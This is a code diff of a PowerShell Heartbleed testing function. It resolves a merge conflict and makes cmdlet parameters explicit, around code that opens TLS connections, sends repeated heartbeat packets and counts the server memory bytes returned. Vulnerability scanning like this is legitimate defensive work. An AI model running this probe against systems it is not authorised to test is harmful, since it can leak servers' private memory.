@@ -103,12 +103,7 @@ function Test-Heartbleed
             [int]$Port=443,
 
         [Parameter(
-<<<<<<< HEAD
-            HelpMessage="Number of heartbeats to send",
-            ValueFromPipelineByPropertyName = $true)]
-=======
             HelpMessage="Number of TLS connection attempts to make")]
->>>>>>> remotes/jsthyer/powerbleed/master
             [int]$TLSTries=3,
 
         [Parameter(
@@ -155,17 +150,17 @@ function Test-Heartbleed
         foreach($computer in $Computername)
         {
             $vulnerable = $true
-            Write-Verbose "Testing $($computer)"
+            Write-Verbose -Message "Testing $($computer)"
             $IP = [System.Net.Dns]::GetHostByName($computer).AddressList[0].IPAddressToString
             $offset = 0
-            $temp = New-Object Byte[] 16384
-            $buf = New-Object Byte[] 8388608
+            $temp = New-Object -TypeName Byte[] 16384
+            $buf = New-Object -TypeName Byte[] 8388608
 
             for ($nt = 0; $nt -lt $TLSTries; $nt++) {
                 $msg = "Connection attempt number: {0}" -f ($nt + 1)
-                Write-Verbose $msg
+                Write-Verbose -Message $msg
                 Try {
-                    $tcp = New-Object System.Net.Sockets.TcpClient
+                    $tcp = New-Object -TypeName System.Net.Sockets.TcpClient
                     $conn = $tcp.BeginConnect($IP,$Port,$null,$null)
                     $wait = $conn.AsyncWaitHandle.WaitOne($Timeout,$false)
 
@@ -203,7 +198,7 @@ function Test-Heartbleed
                         Throw [System.Exception] "Malformed TLS Server Hello"
                     }
 
-                    Write-Verbose "Sending $($Heartbeats) TLS heartbeat packets"
+                    Write-Verbose -Message "Sending $($Heartbeats) TLS heartbeat packets"
                     for ($i=0; $i -lt $Heartbeats; $i++) 
                     {
                         $stream.Write($heartbeat,0,$heartbeat.Length)
@@ -213,7 +208,7 @@ function Test-Heartbleed
                 
                         if(!$wait) 
                         {
-                            Write-Verbose "No Response to TLS HeartBeat() request on $($computer). Attepmp $($nt)."
+                            Write-Verbose -Message "No Response to TLS HeartBeat() request on $($computer). Attepmp $($nt)."
                             $vulnerable = $false
                             break
                         }
@@ -224,13 +219,13 @@ function Test-Heartbleed
                         }
                         Catch
                         {
-                            Write-Verbose "Could not read response from host $($computer). Attepmp $($nt)."
+                            Write-Verbose -Message "Could not read response from host $($computer). Attepmp $($nt)."
                             $vulnerable = $false
                             break
                         }
 
                         $msg = ": {0,5} bytes returned from server. ({1} total bytes)" -f $n,$offset
-                        Write-Verbose $msg
+                        Write-Verbose -Message $msg
                 
                         if (!$NoRandomDelay) 
                         {
